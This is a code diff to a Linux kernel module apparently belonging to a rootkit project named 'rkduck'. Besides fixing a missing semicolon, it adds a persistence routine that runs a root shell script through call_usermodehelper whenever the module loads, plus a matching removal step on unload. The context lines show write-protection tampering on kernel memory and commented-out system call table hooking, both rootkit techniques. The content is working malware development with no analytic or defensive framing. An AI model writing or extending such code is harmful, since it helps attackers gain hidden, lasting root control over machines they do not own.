@@ -10,7 +10,10 @@
 //#include <asm/semaphore.h>
 #include <asm/cacheflush.h>
 
-MODULE_LICENSE("GPL")
+MODULE_LICENSE("GPL");
+
+#define FOREVER_START "/bin/bash /root/Documents/rkduck/forever.sh install"
+#define FOREVER_STOP "/bin/bash /root/Documents/rkduck/forever.sh remove"
 
 int rooty_init(void);
 void rooty_exit(void);
@@ -74,7 +77,14 @@ int make_ro(unsigned long address) {
     pte_t *pte = lookup_address(address, &level);
     pte->pte = pte->pte &~ _PAGE_RW;
     return 0;
+}
 
+void persistence(void) {
+
+    char *argv[] = { "/bin/bash", "-c", FOREVER_START, NULL };
+    char *envp[] = { "HOME=/", NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
 
 int rooty_init(void) {
 
@@ -99,6 +109,8 @@ int rooty_init(void) {
  // /* return sys_call_table to WP */
  // write_cr0(read_cr0() | 0x10000);
 
+    persistence();
+
     return 0;
 }
 
@@ -111,6 +123,10 @@ void rooty_exit(void) {
  // write_cr0(read_cr0() & (~ 0x10000));
  // xchg(&sys_call_table[__NR_write],o_write);
  // write_cr0(read_cr0() | 0x10000);
+
+    char *argv[] = { "/bin/bash", "-c", FOREVER_STOP, NULL };
+    char *envp[] = { "HOME=/", NULL };
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 
     printk("rooty: Module unloaded\n");
 }
